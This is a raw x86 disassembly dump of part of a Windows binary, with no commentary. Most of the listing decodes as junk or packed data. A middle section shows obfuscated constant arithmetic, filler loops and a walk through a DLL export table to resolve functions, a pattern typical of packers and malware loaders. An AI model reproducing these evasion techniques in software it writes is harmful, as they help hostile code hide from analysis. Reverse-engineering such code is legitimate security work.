  4062c6:	xchg   ecx,eax
  4062c7:	pop    es
  4062c8:	call   0xa13d:0xe35f32fd
  4062cf:	repnz (bad) 
  4062d3:	add    eax,0x5696ded2
  4062d8:	mov    ds:0x547af787,al
  4062dd:	scas   al,BYTE PTR es:[edi]
  4062de:	in     al,dx
  4062df:	jno    0x4062be
  4062e1:	popf   
  4062e2:	push   ecx
  4062e3:	adc    BYTE PTR [ebx-0x32889d06],ch
  4062e9:	pop    ss
  4062ea:	stc    
  4062eb:	cs ins BYTE PTR es:[edi],dx
  4062ed:	std    
  4062ee:	ds enter 0xe67,0x81
  4062f3:	lea    ebx,[eax+eax*8]
  4062f6:	mov    esp,0x4b080975
  4062fb:	jmp    0x9af6f6fe
  406300:	pushf  
  406301:	mov    ecx,0x8654adae
  406306:	or     DWORD PTR [esi],ecx
  406308:	pop    edi
  406309:	mov    ch,0xe3
  40630b:	repz dec esp
  40630d:	pop    ecx
  40630e:	out    dx,eax
  40630f:	sbb    al,0x27
  406311:	jmp    0xaddadf64
  406316:	push   ebp
  406317:	adc    cl,BYTE PTR [ebp+0x657cda17]
  40631d:	call   0xb06b7065
  406322:	dec    edx
  406323:	mov    eax,ds:0x3be65ff7
  406328:	jo     0x40633d
  40632a:	(bad)  
  40632c:	nop
  40632d:	push   ebx
  40632e:	dec    ebx
  40632f:	sub    eax,0x6d2f62a8
  406334:	or     DWORD PTR [eax+0x214f6b07],esp
  40633a:	mov    BYTE PTR [ebp-0x4e],bl
  40633d:	push   0xe84b709f
  406342:	fs call 0xc2e0:0xaef8df13
  40634a:	call   FWORD PTR [ecx]
  40634c:	add    eax,0x6b206154
  406351:	ss adc al,0x5
  406354:	add    DWORD PTR [ebp+0x72],ebp
  406357:	xor    bl,0x3c
  40635a:	xor    BYTE PTR [ecx+0x3d],dl
  40635d:	mov    ?,WORD PTR [ebp-0x4d]
  406360:	icebp  
  406361:	or     al,ah
  406363:	imul   ebx,ebp,0x66
  406366:	(bad)  
  406368:	xlat   BYTE PTR ds:[ebx]
  406369:	popa   
  40636a:	cmp    edx,DWORD PTR [edx+0x262b4980]
  406370:	cmp    DWORD PTR [edi+0x22cf1a76],ecx
  406376:	sahf   
  406377:	mov    WORD PTR [eax],?
  406379:	in     al,0xe6
  40637b:	sub    bh,BYTE PTR [eax]
  40637d:	mov    BYTE PTR [edi-0x64e9294b],0x87
  406384:	mov    edi,gs
  406386:	add    BYTE PTR ds:0x975425ea,bl
  40638c:	xchg   esi,eax
  40638d:	sbb    dl,ch
  40638f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406390:	out    dx,eax
  406391:	or     BYTE PTR [ecx-0x50],dl
  406394:	std    
  406395:	pop    edx
  406396:	les    esp,FWORD PTR [edi]
  406398:	stos   BYTE PTR es:[edi],al
  406399:	xor    dh,BYTE PTR [edi-0x38d6d12c]
  40639f:	outs   dx,DWORD PTR ds:[esi]
  4063a0:	in     eax,dx
  4063a1:	fs inc ebx
  4063a3:	int    0xfc
  4063a5:	sub    BYTE PTR ds:0x45c14f85,cl
  4063ab:	add    BYTE PTR [ecx],ah
  4063ad:	pop    ebp
  4063ae:	mov    bl,0x78
  4063b0:	jmp    0xf15a:0xc80a76e6
  4063b7:	arpl   WORD PTR [edi+0x58],bp
  4063ba:	test   eax,0x42cc1bb5
  4063bf:	sti    
  4063c0:	out    0xa6,al
  4063c2:	sbb    eax,0xb23b11a4
  4063c7:	dec    esi
  4063c8:	jge    0x406430
  4063ca:	daa    
  4063cb:	shl    BYTE PTR ds:0xb591db08,0x91
  4063d2:	jmp    0x40639a
  4063d4:	(bad)  
  4063d6:	cmp    DWORD PTR [ebx+edi*4],ecx
  4063d9:	sub    bh,BYTE PTR [edi-0x18a5f37b]
  4063df:	jb     0x406436
  4063e1:	adc    ch,bl
  4063e3:	(bad)  
  4063e4:	push   edi
  4063e5:	ret    
  4063e6:	mov    ds:0x7a58239e,al
  4063eb:	rol    esp,cl
  4063ed:	xor    eax,0xfa31bfd7
  4063f2:	cmp    esp,ecx
  4063f4:	mov    ah,0xe6
  4063f6:	inc    esi
  4063f7:	rcl    cl,1
  4063f9:	bnd jb 0x406394
  4063fc:	pop    es
  4063fd:	push   ebp
  4063fe:	dec    edx
  4063ff:	stc    
  406400:	sbb    eax,0x604d72a0
  406405:	les    edi,FWORD PTR [edx-0x64]
  406408:	xchg   esi,eax
  406409:	xlat   BYTE PTR ds:[ebx]
  40640a:	pop    ecx
  40640b:	xor    BYTE PTR [esi-0x77aced0a],bl
  406411:	sbb    dh,BYTE PTR [edi]
  406413:	and    bh,bl
  406415:	mov    ds:0x544af14,al
  40641a:	outs   dx,BYTE PTR ds:[esi]
  40641b:	jl     0x40645a
  40641d:	cmp    cl,BYTE PTR [ecx+eiz*8]
  406420:	mov    cl,0xb9
  406422:	into   
  406423:	aam    0xb9
  406425:	sub    ch,BYTE PTR [edi-0x78]
  406428:	in     eax,0x19
  40642a:	je     0x406436
  40642c:	iret   
  40642d:	addr16 add dh,bl
  406430:	mov    al,ds:0xe6bf966d
  406435:	xor    edx,DWORD PTR [edi+0x49a55106]
  40643b:	xor    al,0x32
  40643d:	sti    
  40643e:	inc    eax
  40643f:	mov    esp,0xd98a3e3f
  406444:	or     DWORD PTR [edx],edi
  406446:	cmp    edi,eax
  406448:	in     al,dx
  406449:	add    al,0xe
  40644b:	sub    al,0x97
  40644d:	pop    ebp
  40644e:	sub    eax,0x9bffc05a
  406453:	jb     0x406468
  406455:	popa   
  406456:	pop    ebp
  406457:	sub    ebx,esi
  406459:	cmp    eax,0xd110a0d3
  40645e:	mov    es,WORD PTR [edi-0x41b523b9]
  406464:	(bad)  
  406465:	out    0x51,eax
  406467:	pcmpgtd mm1,QWORD PTR [ecx+0x76]
  40646b:	test   eax,0x31d6fd9f
  406470:	jnp    0x40642a
  406472:	cmp    eax,0xdfda5e48
  406477:	lahf   
  406478:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406479:	mov    al,0xfb
  40647b:	dec    esi
  40647c:	repnz out dx,al
  40647e:	dec    eax
  40647f:	push   ecx
  406480:	sar    DWORD PTR [edx+0x1c],cl
  406483:	call   0x4150:0x9fc57272
  40648a:	inc    ecx
  40648b:	adc    ch,BYTE PTR [ebp+ecx*4+0x72e5e2a7]
  406492:	(bad)  
  406493:	retf   0x26e1
  406496:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406497:	jns    0x40641d
  406499:	mov    ebp,0x150e4e12
  40649e:	dec    ebp
  40649f:	inc    BYTE PTR [edx-0x44]
  4064a2:	cmp    al,0xb3
  4064a4:	out    dx,al
  4064a5:	sbb    ecx,esi
  4064a7:	sti    
  4064a8:	icebp  
  4064a9:	adc    al,BYTE PTR [edx+0x7c]
  4064ac:	stos   DWORD PTR es:[edi],eax
  4064ad:	or     DWORD PTR [ebx+0x69],0x70e9bde3
  4064b4:	mov    dh,0x63
  4064b6:	inc    esi
  4064b7:	cmc    
  4064b8:	gs xchg esi,eax
  4064ba:	mov    esp,0x8dc4682a
  4064bf:	jae    0x40647e
  4064c1:	(bad)  
  4064c2:	test   al,0x75
  4064c4:	stc    
  4064c5:	and    DWORD PTR gs:[esi],0x14
  4064c9:	or     BYTE PTR [edx+0x7a],0x13
  4064cd:	pop    edi
  4064ce:	lea    ebx,[ebx+0xc]
  4064d1:	repz push 0xc4d76d14
  4064d7:	sahf   
  4064d8:	pop    ecx
  4064d9:	cmp    eax,0xb915346d
  4064de:	dec    eax
  4064df:	add    dh,0xe5
  4064e2:	aaa    
  4064e3:	jmp    0x406545
  4064e5:	loop   0x406531
  4064e7:	outs   dx,BYTE PTR ds:[esi]
  4064e8:	jg     0x40647e
  4064ea:	arpl   WORD PTR [esi-0x67],bx
  4064ed:	jg     0x406474
  4064ef:	jbe    0x40650b
  4064f1:	xor    BYTE PTR [esi-0x1d],al
  4064f4:	sbb    dh,BYTE PTR [eax]
  4064f6:	cmp    cl,cl
  4064f8:	fimul  WORD PTR ds:0xa09c8fd1
  4064fe:	xor    al,0x64
  406500:	or     cl,BYTE PTR [ecx]
  406502:	adc    dh,BYTE PTR [ecx+0x5abacee8]
  406508:	fmul   QWORD PTR [ebx+ebp*8]
  40650b:	(bad)  
  40650c:	cwde   
  40650d:	jb     0x406558
  40650f:	not    esi
  406511:	sbb    BYTE PTR [eax],ah
  406513:	jmp    0x551ba430
  406518:	pop    ss
  406519:	out    dx,al
  40651a:	adc    al,BYTE PTR [esi+edx*2-0x36110a91]
  406521:	mov    al,ds:0x8e516258
  406526:	mul    DWORD PTR [ebx]
  406528:	ins    BYTE PTR es:[edi],dx
  406529:	enter  0xd1dd,0x33
  40652d:	test   BYTE PTR [edi],al
  40652f:	xor    ecx,ecx
  406531:	push   0x56
  406533:	loopne 0x4064f2
  406535:	outs   dx,BYTE PTR ds:[esi]
  406536:	pop    esp
  406537:	sub    ah,BYTE PTR [esi*4+0x6bc4dbf7]
  40653e:	inc    ebp
  40653f:	(bad)  
  406541:	mov    ecx,0x2639ba79
  406546:	add    al,0xd8
  406548:	in     al,0x32
  40654a:	call   DWORD PTR ss:[edi-0x271a0c25]
  406551:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406552:	mov    eax,ds:0x4b3304c7
  406557:	jge    0x406574
  406559:	xlat   BYTE PTR ds:[ebx]
  40655a:	pop    ebx
  40655b:	push   0x62
  40655d:	fadd   DWORD PTR [edi-0x7f560248]
  406563:	stos   DWORD PTR es:[edi],eax
  406564:	pop    edi
  406565:	cmp    al,0x69
  406567:	pop    ds
  406568:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406569:	push   esp
  40656a:	dec    eax
  40656b:	mov    DWORD PTR [ecx],ebx
  40656d:	mov    edx,0x597ec49f
  406572:	out    0xfc,al
  406574:	push   ss
  406575:	bound  edx,QWORD PTR [edx]
  406577:	cwde   
  406578:	rcl    BYTE PTR [eax],1
  40657a:	mov    eax,0xba177208
  40657f:	retf   0xe6ba
  406582:	ins    BYTE PTR es:[edi],dx
  406583:	xchg   ebx,eax
  406584:	xor    DWORD PTR [edi-0x1b7903e7],eax
  40658a:	cld    
  40658b:	loop   0x40658a
  40658d:	sub    eax,0xe72d09e2
  406592:	ins    BYTE PTR es:[edi],dx
  406593:	retf   
  406594:	mov    dh,0x94
  406596:	mov    cl,0xaa
  406598:	pusha  
  406599:	std    
  40659a:	cmp    eax,0x70d50186
  40659f:	mov    edx,0xb49a3962
  4065a4:	pop    ebp
  4065a5:	(bad)  
  4065a7:	outs   dx,DWORD PTR ds:[esi]
  4065a8:	bound  ebx,QWORD PTR [ebp+0x54d2b563]
  4065ae:	cs push 0xffffffba
  4065b1:	enter  0x7f8,0x2a
  4065b5:	jno    0x406570
  4065b7:	add    DWORD PTR [esi-0x1044670b],edx
  4065bd:	test   DWORD PTR ds:0xf4175791,edi
  4065c3:	jae    0x406641
  4065c5:	jns    0x40658a
  4065c7:	inc    edx
  4065c8:	loop   0x406582
  4065ca:	dec    ebx
  4065cb:	fwait
  4065cc:	xor    al,0xb9
  4065ce:	mov    al,ds:0x41486744
  4065d3:	sbb    eax,0x4fd65b4
  4065d8:	test   BYTE PTR [eax-0x10c57b0e],dl
  4065de:	xor    al,0xd1
  4065e0:	or     eax,0x250bdb5c
  4065e5:	aaa    
  4065e6:	pop    edi
  4065e7:	cs adc eax,0x8d25968d
  4065ed:	int    0xff
  4065ef:	sbb    DWORD PTR ds:0x426000,0x42900c
  4065f9:	xor    ecx,ebx
  4065fb:	xor    DWORD PTR ds:0x425008,0xe68
  406605:	xor    edx,ebx
  406607:	mov    DWORD PTR ds:0x427008,0xa36
  406611:	cmp    edx,ecx
  406613:	mov    DWORD PTR ds:0x425000,0x1171
  40661d:	je     0x40684c
  406623:	mov    ecx,DWORD PTR [ebp-0x4]
  406626:	xor    ecx,ebx
  406628:	adc    DWORD PTR ds:0x427000,0x2a26
  406632:	add    ecx,eax
  406634:	cmp    esi,ecx
  406636:	jne    0x4067ef
  40663c:	push   DWORD PTR [ebp+0x8]
  40663f:	call   0x415b52
  406644:	mov    ecx,DWORD PTR ds:0x41d29c
  40664a:	mov    ecx,DWORD PTR [ecx]
  40664c:	and    DWORD PTR ds:0x42900c,ecx
  406652:	mov    DWORD PTR [ebp-0x18],eax
  406655:	mov    eax,DWORD PTR [ebp-0x4]
  406658:	mov    DWORD PTR ds:0x428018,0x10
  406662:	cmp    DWORD PTR ds:0x428018,0x0
  406669:	je     0x4066c2
  40666f:	cmp    DWORD PTR ds:0x428018,0x7
  406676:	jne    0x406685
  40667c:	push   DWORD PTR [ebp-0x28]
  40667f:	call   DWORD PTR ds:0x421004
  406685:	cmp    DWORD PTR ds:0x428018,0x8
  40668c:	jne    0x40669f
  406692:	mov    edi,DWORD PTR ds:0x428018
  406698:	dec    edi
  406699:	mov    DWORD PTR ds:0x428018,edi
  40669f:	mov    edi,DWORD PTR ds:0x428018
  4066a5:	dec    edi
  4066a6:	mov    DWORD PTR ds:0x428018,edi
  4066ac:	jmp    0x406662
  4066b1:	mov    ecx,DWORD PTR ds:0x41ffff
  4066b7:	mov    edi,DWORD PTR ds:0x41d264
  4066bd:	sub    edi,ecx
  4066bf:	add    ecx,DWORD PTR [ecx+edi*1]
  4066c2:	mov    ecx,DWORD PTR [ebp-0x18]
  4066c5:	xor    eax,ebx
  4066c7:	mov    edi,0x3272db
  4066cc:	add    eax,edi
  4066ce:	mov    DWORD PTR ds:0x425008,0x2bfa
  4066d8:	cmp    ecx,eax
  4066da:	je     0x4068bc
  4066e0:	sbb    DWORD PTR ds:0x426000,0x426010
  4066ea:	push   DWORD PTR [ebp-0x18]
  4066ed:	push   DWORD PTR [ebp+0x8]
  4066f0:	call   0x417fa0
  4066f5:	sbb    DWORD PTR ds:0x42601c,ecx
  4066fb:	mov    DWORD PTR [ebp-0x18],eax
  4066fe:	dec    eax
  4066ff:	mov    eax,DWORD PTR [ebp-0x4]
  406702:	and    DWORD PTR ds:0x425018,0x0
  40670c:	jmp    0x40671e
  406711:	mov    ecx,DWORD PTR ds:0x425018
  406717:	inc    ecx
  406718:	mov    DWORD PTR ds:0x425018,ecx
  40671e:	cmp    DWORD PTR ds:0x425018,0x1e
  406725:	jae    0x40674c
  40672b:	cmp    DWORD PTR ds:0x425018,0x2e
  406732:	jne    0x406741
  406738:	push   DWORD PTR [ebp-0x20]
  40673b:	call   DWORD PTR ds:0x421048
  406741:	jmp    0x406711
  406746:	sbb    ecx,DWORD PTR ds:0x42900c
  40674c:	mov    ecx,DWORD PTR [ebp-0x18]
  40674f:	xor    DWORD PTR ds:0x425000,0x426004
  406759:	xor    eax,ebx
  40675b:	sub    DWORD PTR ds:0x42900c,0x26ad
  406765:	add    eax,edi
  406767:	cmp    ecx,eax
  406769:	mov    DWORD PTR ds:0x42501c,0x148e
  406773:	je     0x4068bc
  406779:	mov    eax,DWORD PTR [ebp-0x18]
  40677c:	mov    eax,DWORD PTR [eax+0x18]
  40677f:	mov    ecx,DWORD PTR ds:0x42500c
  406785:	or     DWORD PTR ds:0x428014,ecx
  40678b:	mov    DWORD PTR [ebp-0x24],eax
  40678e:	mov    eax,DWORD PTR [ebp-0x18]
  406791:	mov    ecx,DWORD PTR [ebp+0x8]
  406794:	add    ecx,DWORD PTR [eax+0x20]
  406797:	mov    DWORD PTR [ebp-0x2c],ecx
  40679a:	and    eax,eax
  40679c:	mov    eax,DWORD PTR [ebp-0x18]
  40679f:	and    ecx,DWORD PTR ds:0x427000
  4067a5:	mov    ecx,DWORD PTR [ebp+0x8]
  4067a8:	adc    DWORD PTR ds:0x425004,0x721
  4067b2:	add    ecx,DWORD PTR [eax+0x24]
  4067b5:	movzx  eax,WORD PTR ds:0x428004
  4067bc:	sbb    eax,DWORD PTR ds:0x42801c
  4067c2:	mov    ds:0x428004,eax
  4067c7:	mov    DWORD PTR [ebp-0x34],ecx
  4067ca:	or     DWORD PTR ds:0x429008,edx
  4067d0:	mov    eax,DWORD PTR [ebp-0x18]
  4067d3:	mov    ecx,DWORD PTR [ebp+0x8]
  4067d6:	sbb    DWORD PTR ds:0x427018,0x427008
  4067e0:	add    ecx,DWORD PTR [eax+0x1c]
  4067e3:	not    eax
  4067e5:	mov    eax,edi
  4067e7:	mov    DWORD PTR [ebp-0x18],ecx
  4067ea:	jmp    0x406884
  4067ef:	movzx  ecx,BYTE PTR ds:0x428010
  4067f6:	add    ecx,DWORD PTR ds:0x42700c
  4067fc:	mov    DWORD PTR ds:0x428010,ecx
  406802:	mov    ecx,DWORD PTR [ebp-0x2c]
  406805:	xor    DWORD PTR ds:0x425004,edi
  40680b:	mov    edx,DWORD PTR [ebp+0x8]
  40680e:	and    DWORD PTR ds:0x425020,0x42901c
  406818:	add    edx,DWORD PTR [ecx+esi*4]
  40681b:	inc    ecx
  40681c:	mov    DWORD PTR [ebp-0x28],edx
  40681f:	sub    DWORD PTR ds:0x425000,ecx
  406825:	mov    ecx,DWORD PTR [ebp-0x4]
  406828:	sbb    DWORD PTR ds:0x42500c,0xc10
  406832:	mov    edx,DWORD PTR [ebp-0x28]
  406835:	xor    ecx,ebx
  406837:	dec    DWORD PTR ds:0x42600c
  40683d:	add    ecx,eax
  40683f:	cmp    edx,ecx
  406841:	je     0x406884
  406847:	jmp    0x406870
  40684c:	mov    ecx,DWORD PTR [ebp-0x4]
  40684f:	mov    edx,DWORD PTR [ebp-0x8]
  406852:	xor    ecx,ebx
  406854:	add    ecx,eax
  406856:	cmp    edx,ecx
  406858:	je     0x4068c8
  40685e:	mov    ecx,DWORD PTR [ebp-0x4]
  406861:	mov    edx,DWORD PTR [ebp-0x30]
  406864:	xor    ecx,ebx
  406866:	add    ecx,eax
  406868:	cmp    edx,ecx
  40686a:	je     0x4068d7
  406870:	lea    eax,[ebp-0x8]
  406873:	push   eax
  406874:	push   DWORD PTR [ebp-0x28]
  406877:	push   DWORD PTR [ebp+0xc]
  40687a:	call   0x401000
  40687f:	mov    eax,0x3272db
  406884:	mov    ecx,DWORD PTR [ebp-0x4]
  406887:	mov    edx,DWORD PTR [ebp-0x8]
  40688a:	xor    ecx,ebx
  40688c:	add    ecx,eax
  40688e:	cmp    edx,ecx
  406890:	je     0x4068ab
  406896:	mov    ecx,DWORD PTR [ebp-0x34]
  406899:	movzx  ecx,WORD PTR [ecx+esi*2]
  40689d:	mov    edx,DWORD PTR [ebp-0x18]
  4068a0:	mov    ecx,DWORD PTR [edx+ecx*4]
  4068a3:	mov    DWORD PTR [ebp-0x38],ecx
  4068a6:	jmp    0x40684c
  4068ab:	mov    ecx,DWORD PTR [ebp-0x14]
  4068ae:	xor    ecx,ebx
  4068b0:	lea    esi,[esi+ecx*1+0x3272db]
  4068b7:	jmp    0x40427f
  4068bc:	mov    eax,DWORD PTR [ebp-0x4]
  4068bf:	xor    eax,ebx
  4068c1:	add    eax,edi
  4068c3:	jmp    0x408d90
  4068c8:	mov    eax,DWORD PTR [ebp-0x4]
  4068cb:	xor    eax,ebx
  4068cd:	add    eax,0x3272db
  4068d2:	jmp    0x408d90
  4068d7:	mov    ecx,DWORD PTR [ebp-0x38]
  4068da:	add    ecx,DWORD PTR [ebp+0x8]
  4068dd:	mov    DWORD PTR [ebp-0x10],ecx
  4068e0:	mov    ecx,DWORD PTR [ebp-0x1c]
  4068e3:	test   ecx,ecx
  4068e5:	je     0x408d1b
  4068eb:	mov    DWORD PTR [ebp-0x20],0x0
  4068f2:	push   0x3
  4068f4:	xor    edx,edx
  4068f6:	pop    edx
  4068f7:	add    edx,0x8
  4068fa:	push   edx
  4068fb:	pop    ecx
  4068fc:	push   0x6
  4068fe:	dec    ecx
  4068ff:	pop    ebx
  406900:	dec    ebx
  406901:	xchg   ebx,ecx
  406903:	sub    ebx,ecx
  406905:	xchg   ebx,ecx
  406907:	dec    ecx
  406908:	mov    eax,DWORD PTR [ebp-0x1c]
  40690b:	imul   eax,ecx
  40690e:	sub    esp,eax
  406910:	mov    DWORD PTR [ebp-0x20],esp
  406913:	mov    eax,DWORD PTR [ebp-0x4]
  406916:	mov    ecx,0x7510893
  40691b:	xor    eax,ecx
  40691d:	mov    edx,0x3272db
  406922:	add    eax,edx
  406924:	mov    DWORD PTR [ebp+0x8],eax
  406927:	mov    eax,DWORD PTR [ebp-0x14]
  40692a:	xor    eax,ecx
  40692c:	add    eax,edx
  40692e:	mov    edx,DWORD PTR [ebp+0x14]
  406931:	imul   eax,DWORD PTR [edx]
  406934:	mov    edx,DWORD PTR [ebp-0x4]
  406937:	xor    edx,ecx
  406939:	mov    ecx,DWORD PTR [ebp+0x8]
  40693c:	lea    ecx,[edx+ecx*1+0x3272db]
  406943:	cmp    ecx,eax
  406945:	je     0x408d11
  40694b:	mov    edi,DWORD PTR [ebp-0x14]
  40694e:	mov    eax,DWORD PTR [ebp+0x8]
  406951:	mov    edx,DWORD PTR [ebp+0x14]
  406954:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  406958:	mov    ecx,0x7510893
  40695d:	xor    edx,edx
  40695f:	xor    edi,ecx
  406961:	mov    esi,0x3272db
  406966:	add    edi,esi
  406968:	div    edi
  40696a:	mov    edx,DWORD PTR [ebp-0x4]
  40696d:	xor    edx,ecx
  40696f:	lea    eax,[edx+eax*1+0x3272db]
  406976:	mov    edx,DWORD PTR [ebp+0x8]
  406979:	mov    edi,DWORD PTR [ebp-0x20]
  40697c:	mov    DWORD PTR [edi+edx*4],eax
  40697f:	mov    eax,DWORD PTR [ebp-0x14]
  406982:	mov    edx,DWORD PTR [ebp+0x8]
  406985:	xor    eax,ecx
  406987:	lea    eax,[eax+edx*1+0x3272db]
  40698e:	mov    DWORD PTR [ebp+0x8],eax
  406991:	mov    eax,DWORD PTR [ebp-0x14]
  406994:	mov    edx,DWORD PTR [ebp+0x14]
  406997:	xor    eax,ecx
  406999:	add    eax,esi
  40699b:	imul   eax,DWORD PTR [edx]
  40699e:	mov    edx,DWORD PTR [ebp-0x4]
  4069a1:	xor    edx,ecx
  4069a3:	mov    ecx,DWORD PTR [ebp+0x8]
  4069a6:	lea    ecx,[edx+ecx*1+0x3272db]
  4069ad:	cmp    ecx,eax
  4069af:	jmp    0x408d04
  4069b4:	into   
  4069b5:	mov    BYTE PTR [ecx],bl
  4069b7:	(bad)  
  4069b8:	adc    esp,DWORD PTR [ebx+0x10b2688d]
  4069be:	shl    DWORD PTR [ebx-0x40],0xc1
  4069c2:	call   0x627d2be2
  4069c7:	bound  ebp,QWORD PTR [edx]
  4069c9:	pop    edi
  4069ca:	bound  esp,QWORD PTR [edx+0x2f]
  4069cd:	push   eax
  4069ce:	mov    ah,0x5c
  4069d0:	inc    esi
  4069d1:	inc    ebp
  4069d2:	or     bh,BYTE PTR [edx+0x35]
  4069d5:	cmp    edi,DWORD PTR [ebp+0x6035091f]
  4069db:	mov    al,ds:0x14d5d246
  4069e0:	js     0x406a0c
  4069e2:	not    BYTE PTR [edx+0x25]
  4069e5:	jnp    0x406a15
  4069e7:	cs mov edx,0x3f7f6e61
  4069ed:	mov    ch,0xf3
  4069ef:	test   eax,0x89c5001
  4069f4:	sub    ecx,DWORD PTR [edx+0x2ca4d28b]
  4069fa:	ss leave 
  4069fc:	and    ebx,DWORD PTR [esi]
  4069fe:	mov    ebx,0x82c5b898
  406a03:	mov    ecx,gs
  406a05:	xchg   esp,eax
  406a06:	and    BYTE PTR [esp+ebx*1-0x30bf0e0d],ah
  406a0d:	xchg   edx,eax
  406a0e:	ds icebp 
  406a10:	jae    0x406a3b
  406a12:	add    BYTE PTR [edx+ebx*4-0x6654f2e9],bl
  406a19:	lods   eax,DWORD PTR fs:[esi]
  406a1b:	xchg   edx,eax
  406a1c:	dec    eax
  406a1d:	inc    esp
  406a1e:	repnz hlt 
  406a20:	mov    dh,0x21
  406a22:	and    al,0x93
  406a24:	inc    ebx
  406a25:	sbb    bh,BYTE PTR ds:0xc2e09378
  406a2b:	jmp    0x38c9:0x7694477c
  406a32:	jo     0x4069f1
  406a34:	push   cs
  406a35:	scas   al,BYTE PTR es:[edi]
  406a36:	jl     0x406a26
  406a38:	push   eax
  406a39:	jnp    0x406aa5
  406a3b:	aam    0x16
  406a3d:	sub    DWORD PTR [edi+0x69],0x69
  406a41:	dec    edi
  406a42:	xor    al,0x63
  406a44:	inc    ecx
  406a45:	fisttp QWORD PTR [ecx+0x18]
  406a48:	jnp    0x406aaa
  406a4a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406a4b:	imul   edx,DWORD PTR [eax-0x2],0x28
  406a4f:	fwait
  406a50:	or     eax,ebp
  406a52:	sahf   
  406a53:	or     BYTE PTR [edi-0x51],al
  406a56:	fld1   
  406a58:	mov    edx,0x3f97ef4
  406a5d:	gs xchg edi,eax
  406a5f:	dec    edi
  406a60:	jo     0x406a3a
  406a62:	ret    0xef9a
  406a65:	int    0x11
  406a67:	stos   BYTE PTR es:[edi],al
  406a68:	test   DWORD PTR [ecx],esp
  406a6a:	outs   dx,BYTE PTR ds:[esi]
  406a6b:	push   ds
  406a6c:	mov    dl,0x61
  406a6e:	dec    eax
  406a6f:	jge    0x406a88
  406a71:	cdq    
  406a72:	test   al,0x7d
  406a74:	or     DWORD PTR [ebx],ebp
  406a76:	ror    DWORD PTR [edi-0x10],cl
  406a79:	add    ch,BYTE PTR [ebx+0x63eb342]
  406a7f:	pop    ecx
  406a80:	sahf   
  406a81:	adc    eax,0x4e208dd3
  406a86:	fbld   TBYTE PTR [ebp-0x7d64773a]
  406a8c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406a8d:	ficomp DWORD PTR [eax]
  406a8f:	mov    esp,0xbea8cc16
  406a94:	mov    bh,0xf4
  406a96:	adc    al,0x69
  406a98:	inc    edx
  406a99:	(bad)
  406a9c:	push   es
  406a9d:	pop    ss
  406a9e:	mov    cl,0x1e
  406aa0:	out    dx,al
  406aa1:	inc    ecx
  406aa2:	in     eax,0x7c
  406aa4:	stos   DWORD PTR es:[edi],eax
  406aa5:	mov    al,0x4d
  406aa7:	xor    DWORD PTR ds:0x10a17ab9,ecx
  406aad:	jmp    0x29d62237
  406ab2:	mov    dh,0xb9
  406ab4:	std    
  406ab5:	(bad)  
  406ab6:	mov    WORD PTR [eax],gs
  406ab8:	mov    edx,0x4a04aa18
  406abd:	xchg   DWORD PTR [ebx+0x15],edx
  406ac0:	push   es
  406ac1:	jmp    0xe0a6111c
  406ac6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406ac7:	data16 jbe 0x406a6d
  406aca:	arpl   bp,sp
  406acc:	fiadd  DWORD PTR [edx]
  406ace:	aam    0x9d
  406ad0:	lahf   
  406ad1:	adc    al,0xd8
  406ad3:	push   edi
  406ad4:	ins    BYTE PTR es:[edi],dx
  406ad5:	ror    ebp,cl
  406ad7:	jle    0x406b28
  406ad9:	mov    dl,0x77
  406adb:	popf   
  406adc:	hlt    
  406add:	mov    esi,esi
  406adf:	mov    bh,BYTE PTR [edx]
  406ae1:	fbld   TBYTE PTR [ebx-0x17f53f26]
  406ae7:	xor    al,0x9
  406ae9:	lods   eax,DWORD PTR ds:[esi]
  406aea:	(bad)  
  406aeb:	setb   BYTE PTR [edi-0x2da16eb5]
  406af2:	push   eax
  406af3:	cmp    al,0x1b
  406af5:	xchg   ebx,eax
  406af7:	data16 lahf 
  406af9:	stc    
  406afa:	aad    0x3b
  406afc:	(bad)  
  406afd:	xor    al,BYTE PTR [ebp-0x7c]
  406b00:	xor    eax,0xf4e99046
  406b05:	or     al,0xc9
  406b07:	xor    eax,ecx
  406b09:	cmp    ah,bh
  406b0b:	cmp    DWORD PTR [ebx-0x75],ebx
  406b0e:	mov    es,WORD PTR [eax]
  406b10:	outs   dx,BYTE PTR ds:[esi]
  406b11:	loop   0x406aaa
  406b13:	push   ebp
  406b14:	ins    DWORD PTR es:[edi],dx
  406b15:	cmp    edi,edi
  406b17:	in     al,dx
  406b18:	sti    
  406b19:	outs   dx,BYTE PTR ds:[esi]
  406b1a:	pop    edi
  406b1b:	rcl    DWORD PTR [esi+0x15df969b],1
  406b21:	sbb    edx,DWORD PTR [edi+0x4]
  406b24:	mov    edi,0xf8cb6e7f
  406b29:	mov    ds:0xee8269bc,eax
  406b2e:	sub    edi,edi
  406b30:	fld    TBYTE PTR [edi]
  406b32:	inc    ebp
  406b33:	push   ebx
  406b34:	adc    ebp,DWORD PTR [edi-0xfa2b3e9]
  406b3a:	add    BYTE PTR [ebp-0x5b],bl
  406b3d:	xor    BYTE PTR [ebx-0x4b10ccb8],dl
  406b43:	pop    ecx
  406b44:	pop    edi
  406b45:	cmp    DWORD PTR [eax+0x3e],0xffffffa9
  406b49:	lock xor dh,BYTE PTR [edx+0x195682db]
  406b50:	or     DWORD PTR [eax-0x40ec8434],ebx
  406b56:	(bad)
  406b59:	mov    esi,0x4bf0ab90
  406b5e:	inc    esp
  406b5f:	loope  0x406af5
  406b61:	dec    edi
  406b62:	(bad)  
  406b63:	cmp    DWORD PTR [ebx+0x43],ecx
  406b66:	pop    eax
  406b67:	push   cs
  406b68:	into   
  406b69:	mov    esi,0xf0bb672b
  406b6e:	shr    DWORD PTR [edx-0x56],cl
  406b71:	jb     0x406bd2
  406b73:	sbb    bl,dh
  406b75:	daa    
  406b76:	dec    ecx
  406b77:	mov    ecx,0x3128868f
  406b7c:	and    BYTE PTR [edi-0x53],0x23
  406b80:	dec    ebp
  406b81:	mov    esi,0x28fe5cb5
  406b86:	imul   eax
  406b88:	sbb    esi,esp
  406b8a:	sbb    al,0x3
  406b8c:	test   eax,0x6eb02083
  406b91:	mov    al,ds:0xda5a6514
  406b96:	std    
  406b97:	stos   DWORD PTR es:[edi],eax
